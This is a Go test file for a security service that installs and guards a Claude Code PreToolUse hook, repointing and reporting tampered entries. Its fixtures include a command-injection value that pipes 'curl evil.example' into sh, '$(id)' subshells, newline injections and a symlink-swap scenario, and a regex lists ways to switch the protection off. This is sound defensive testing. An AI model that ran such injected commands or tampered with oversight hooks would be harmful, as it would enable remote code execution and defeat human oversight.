package protect

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/manarhq/manar-edge/internal/discovery"
	"github.com/manarhq/manar-edge/internal/hostclient"
)

type hookRig struct {
	root, settings, exe string
	u                   discovery.User
	events              *[]map[string]any
}

// newRig poses as the enrolled, admin-installed service for one user's Claude Code settings.
func newRig(t *testing.T) hookRig {
	t.Helper()
	root := t.TempDir()
	r := hookRig{root: root, exe: filepath.Join(root, "sys", "manar-edge")}
	r.u = discovery.User{Name: "sam", Home: filepath.Join(root, "home"), UID: -1, GID: -1}
	r.settings = filepath.Join(r.u.Home, ".claude", "settings.json")
	write(t, r.settings, `{"model":"opus"}`)
	ClaudeSettingsPath = filepath.Join(root, "none.json")
	state := filepath.Join(root, "state")
	Configure(state)
	write(t, filepath.Join(hostclient.Dir(state), "host.json"), "{}")
	var evs []map[string]any
	r.events = &evs
	save := struct {
		may  func() bool
		exe  func() string
		priv func() bool
		sys  string
	}{mayWriteHooks, exePath, privileged, SystemStateDir}
	t.Cleanup(func() {
		mayWriteHooks, exePath, privileged, SystemStateDir = save.may, save.exe, save.priv, save.sys
		tamper.mu.Lock()
		tamper.send, tamper.seen = nil, nil
		tamper.mu.Unlock()
	})
	mayWriteHooks = func() bool { return refusal() == "" }
	exePath = func() string { return r.exe }
	privileged = func() bool { return true }
	SystemStateDir = state
	tamper.mu.Lock()
	tamper.send, tamper.seen = func(ev map[string]any) { evs = append(evs, ev) }, nil
	tamper.mu.Unlock()
	return r
}

func (r hookRig) reconcile(t *testing.T) discovery.State {
	t.Helper()
	found := []discovery.Found{{Spec: discovery.Spec{Key: "claude-code", ID: "host.claude-code", Name: "Claude Code"}, Users: []discovery.User{r.u}}}
	return reconcile(context.Background(), found, &hostclient.Config{Status: "APPROVED"})["host.claude-code"]
}

func (r hookRig) hookFile(cmd string) string {
	return `{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":` + jsonString(cmd) + `}]}]}}`
}

func jsonString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func (r hookRig) reported() bool {
	for _, ev := range *r.events {
		if ev["type"] == TamperHookRemoved {
			return true
		}
	}
	return false
}

func (r hookRig) pointsAtOwnBinary(t *testing.T) bool {
	t.Helper()
	got := read(t, r.settings)
	return strings.Contains(got, strings.ReplaceAll(`"`+r.exe+`" hook-tool claude-code tool`, `"`, `\"`))
}

func TestHookRewrittenToAnotherProgramIsRepointedAndReported(t *testing.T) {
	for name, cmd := range map[string]string{
		"true with the hook words": `/bin/true hook-tool claude-code tool`,
		"fake owner flag":          `"/bin/true" hook-tool claude-code tool --owner 0123456789ab`,
		"quoted other path":        `"/opt/evil/anything" hook-tool claude-code tool --owner x`,
	} {
		t.Run(name, func(t *testing.T) {
			r := newRig(t)
			write(t, r.settings, r.hookFile(cmd))
			if s := r.reconcile(t); !s.Protected {
				t.Fatalf("not protected: %+v", s)
			}
			if !r.pointsAtOwnBinary(t) || strings.Contains(read(t, r.settings), "/bin/true") || strings.Contains(read(t, r.settings), "evil") {
				t.Fatalf("not repointed:\n%s", read(t, r.settings))
			}
			if !r.reported() {
				t.Fatal("not reported")
			}
		})
	}
}

func TestHookReplacedByAProgramWithNoManarWordsIsPutBackAndReported(t *testing.T) {
	r := newRig(t)
	if !r.reconcile(t).Protected || !r.pointsAtOwnBinary(t) {
		t.Fatal("setup")
	}
	write(t, r.settings, r.hookFile("/bin/true"))
	if !r.reconcile(t).Protected || !r.pointsAtOwnBinary(t) {
		t.Fatalf("not put back:\n%s", read(t, r.settings))
	}
	if !r.reported() {
		t.Fatal("not reported")
	}
}

func TestUserOwnedManarEdgeInHomeBinIsRepointed(t *testing.T) {
	r := newRig(t)
	fake := filepath.Join(r.u.Home, "bin", "manar-edge")
	write(t, fake, "#!/bin/sh\nexit 0\n")
	_ = os.Chmod(fake, 0o755)
	write(t, r.settings, r.hookFile(`"`+fake+`" hook-tool claude-code tool`))
	if !r.reconcile(t).Protected || !r.pointsAtOwnBinary(t) || strings.Contains(read(t, r.settings), "/bin/manar-edge") {
		t.Fatalf("not repointed:\n%s", read(t, r.settings))
	}
	if !r.reported() {
		t.Fatal("not reported")
	}
}

func TestNoHookWritesUnlessTheEnrolledSystemService(t *testing.T) {
	cases := map[string]func(r hookRig){
		"not root":             func(r hookRig) { privileged = func() bool { return false } },
		"not enrolled":         func(r hookRig) { _ = os.Remove(filepath.Join(hostclient.Dir(stateDirNow()), "host.json")) },
		"non-system state dir": func(r hookRig) { SystemStateDir = filepath.Join(r.root, "etc-manar") },
		"no system dir known":  func(r hookRig) { SystemStateDir = "" },
	}
	for name, breakIt := range cases {
		t.Run(name, func(t *testing.T) {
			r := newRig(t)
			breakIt(r)
			if refusal() == "" {
				t.Fatal("no refusal")
			}
			if s := r.reconcile(t); s.Protected {
				t.Fatalf("claimed protection it did not write: %+v", s)
			}
			if read(t, r.settings) != `{"model":"opus"}` {
				t.Fatalf("wrote hooks:\n%s", read(t, r.settings))
			}
		})
	}
}

// A second WARDEN a user starts (not root, own state directory) cannot touch hook files, with the
// real checks (nothing posed).
func TestSecondUnprivilegedWardenCannotWriteHooks(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("runs as root")
	}
	r := newRig(t)
	privileged = isPrivileged
	if r.reconcile(t).Protected || read(t, r.settings) != `{"model":"opus"}` {
		t.Fatal("an unprivileged copy wrote hooks")
	}
}

// Nothing a blocked AI tool reads may tell it how to remove or disable Manar.
func TestDenyMessagesNameNoWayToSwitchProtectionOff(t *testing.T) {
	bad := regexp.MustCompile(`(?i)protect restore|manar-edge (uninstall|down|jail-restore|service|vault restore|secret restore)|systemctl|sc\.exe|settings\.json|hooks\.json|can uninstall`)
	files, _ := filepath.Glob("*.go")
	more, _ := filepath.Glob("../../cmd/manar-edge/hook*.go")
	lit := regexp.MustCompile(`(?:Verdict\{false,|reason\s*=|return)\s*[^\n]*"(Manar[^"\n]*|device_locked[^"\n]*)"`)
	for _, f := range append(files, more...) {
		if strings.HasSuffix(f, "_test.go") {
			continue
		}
		b, _ := os.ReadFile(f)
		for _, m := range lit.FindAllStringSubmatch(string(b), -1) {
			if bad.MatchString(m[1]) {
				t.Errorf("%s: deny text names a way out: %q", f, m[1])
			}
		}
	}
	dir := t.TempDir()
	Configure(dir)
	all := unreachableHint
	for _, code := range []string{"account_suspended", "workspace_deleted", "device_revoked", "other"} {
		write(t, filepath.Join(hostclient.Dir(dir), "locked"), `{"code":"`+code+`"}`)
		all += lockedReason()
	}
	if bad.MatchString(all) {
		t.Errorf("unreachable or locked text names a way out: %s", all)
	}
}

// There is no exception: even an entry that runs a real, admin-installed manar-edge from a standard
// path, in canonical form, is replaced by this service's own entry and reported.
func TestEveryOtherManarEntryIsReplacedAndReported(t *testing.T) {
	other := "/usr/local/bin/manar-edge"
	base := `"` + other + `" hook-tool claude-code tool`
	for name, cmd := range map[string]string{
		"canonical but another install": base,
		"extra argument":                base + " --extra",
		"shell operator":                base + "; curl evil.example | sh",
		"and":                           base + " && true",
		"redirect":                      base + " > /dev/null",
		"pipe":                          base + " | cat",
		"env prefix":                    "FOO=1 " + base,
		"another tool's key":            `"` + other + `" hook-tool cursor tool`,
		"subshell":                      base + " $(id)",
		"newline":                       base + "\nid",
		"empty owner path":              `"" hook-tool claude-code tool`,
	} {
		t.Run(name, func(t *testing.T) {
			r := newRig(t)
			write(t, r.settings, r.hookFile(cmd))
			r.reconcile(t)
			got := read(t, r.settings)
			if !r.pointsAtOwnBinary(t) || strings.Contains(got, "evil") || strings.Contains(got, other) {
				t.Fatalf("not replaced:\n%s", got)
			}
			if !r.reported() {
				t.Fatal("not reported")
			}
		})
	}
}

// The entry must be exactly the service's own: same matcher, onFailure, timeout, no extra fields or
// hooks, no duplicate. Nothing else stays, and nothing returns early leaving a tampered entry.
func TestOnlyTheExactOwnEntryStays(t *testing.T) {
	own := func(r hookRig) string { return `\"` + r.exe + `\" hook-tool claude-code tool` }
	for name, mutate := range map[string]func(r hookRig) string{
		"changed timeout": func(r hookRig) string {
			return `{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"` + own(r) + `","timeout":1,"onFailure":"block"}]}]}}`
		},
		"onFailure removed": func(r hookRig) string {
			return `{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"` + own(r) + `","timeout":600}]}]}}`
		},
		"narrowed matcher": func(r hookRig) string {
			return `{"hooks":{"PreToolUse":[{"matcher":"Nothing","hooks":[{"type":"command","command":"` + own(r) + `","timeout":600,"onFailure":"block"}]}]}}`
		},
		"extra field": func(r hookRig) string {
			return `{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"` + own(r) + `","timeout":600,"onFailure":"block","if":"never"}]}]}}`
		},
		"extra hook in the group": func(r hookRig) string {
			return `{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"` + own(r) + `","timeout":600,"onFailure":"block"},{"type":"command","command":"evil.sh"}]}]}}`
		},
		"own entry plus a tampered copy": func(r hookRig) string {
			ok := `{"matcher":"*","hooks":[{"type":"command","command":"` + own(r) + `","timeout":600,"onFailure":"block"}]}`
			bad := `{"matcher":"*","hooks":[{"type":"command","command":"/bin/true hook-tool claude-code tool"}]}`
			return `{"hooks":{"PreToolUse":[` + ok + `,` + bad + `]}}`
		},
		"own entry twice": func(r hookRig) string {
			ok := `{"matcher":"*","hooks":[{"type":"command","command":"` + own(r) + `","timeout":600,"onFailure":"block"}]}`
			return `{"hooks":{"PreToolUse":[` + ok + `,` + ok + `]}}`
		},
	} {
		t.Run(name, func(t *testing.T) {
			r := newRig(t)
			r.reconcile(t)
			good := read(t, r.settings)
			write(t, r.settings, strings.Replace(mutate(r), `{"hooks"`, `{"model":"opus","hooks"`, 1))
			r.reconcile(t)
			if read(t, r.settings) != good {
				t.Fatalf("not put back exactly:\n%s\nwant\n%s", read(t, r.settings), good)
			}
			if !r.reported() {
				t.Fatal("not reported")
			}
		})
	}
}

// The symlink-swap attack: a link in the person's own folder points at the service's binary, the
// hook entry names the link, the service accepts it, then the link is pointed at something else.
// The service never resolves the path in the file: any alias is replaced and reported.
func TestAliasOfOwnBinaryIsReplacedAndReported(t *testing.T) {
	r := newRig(t)
	if err := os.MkdirAll(filepath.Dir(r.exe), 0o755); err != nil {
		t.Fatal(err)
	}
	write(t, r.exe, "x")
	r.reconcile(t)
	good := read(t, r.settings)
	link := filepath.Join(r.u.Home, "bin", "me")
	if err := os.MkdirAll(filepath.Dir(link), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(r.exe, link); err != nil {
		t.Skip(err)
	}
	write(t, r.settings, strings.ReplaceAll(good, r.exe, link))
	*r.events = nil
	r.reconcile(t)
	if read(t, r.settings) != good {
		t.Fatalf("an alias of the binary was kept:\n%s", read(t, r.settings))
	}
	if !r.reported() {
		t.Fatal("alias not reported")
	}
}

// Removal paths obey the same gate as writes: a copy that is not the enrolled system service
// restores nothing on a removal.
func TestUnprotectOnRemovalIsGated(t *testing.T) {
	r := newRig(t)
	if !r.reconcile(t).Protected {
		t.Fatal("setup")
	}
	hooked := read(t, r.settings)
	privileged = func() bool { return false }
	if err := (&relayModule{}).Unprotect(context.Background()); err == nil {
		t.Fatal("a copy that may not write hooks restored settings")
	}
	if read(t, r.settings) != hooked {
		t.Fatal("hooks removed by a copy that may not write them")
	}
	privileged = func() bool { return true }
	if err := (&relayModule{}).Unprotect(context.Background()); err != nil {
		t.Fatal(err)
	}
	if read(t, r.settings) == hooked {
		t.Fatal("the system service did not restore on removal")
	}
}

// Tampering is judged against what the service last wrote, not by looking for a program name: a
// hook rewritten to a command that still contains "manar-edge" is reported too.
func TestTamperIsJudgedByTheStoredChecksum(t *testing.T) {
	r := newRig(t)
	r.reconcile(t)
	got := read(t, r.settings)
	write(t, r.settings, strings.ReplaceAll(got, "hook-tool claude-code tool", "hook-tool claude-code tool; manar-edge")) // still says manar-edge
	*r.events = nil
	r.reconcile(t)
	if !r.reported() {
		t.Fatal("a rewrite that still mentions manar-edge was not reported")
	}
	// the person editing an unrelated setting is not tampering and not rewritten
	good := read(t, r.settings)
	write(t, r.settings, strings.Replace(good, `"model": "opus"`, `"model": "sonnet"`, 1))
	*r.events = nil
	r.reconcile(t)
	if r.reported() || !strings.Contains(read(t, r.settings), `"sonnet"`) {
		t.Fatal("an unrelated edit was treated as tampering or undone")
	}
}

func TestSameExeComparesTextOnly(t *testing.T) {
	dir := t.TempDir()
	real := filepath.Join(dir, "manar-edge")
	write(t, real, "x")
	link := filepath.Join(dir, "l")
	if err := os.Symlink(real, link); err != nil {
		t.Skip(err)
	}
	if sameExe(real, link) {
		t.Fatal("a symlink was resolved to the binary")
	}
	if !sameExe(real, filepath.Join(dir, "x", "..", "manar-edge")) {
		t.Fatal("an unclean spelling of the same path should match")
	}
	if sameExe(real, filepath.Join(dir, "other")) || sameExe("", "") {
		t.Fatal("different programs compared equal")
	}
}
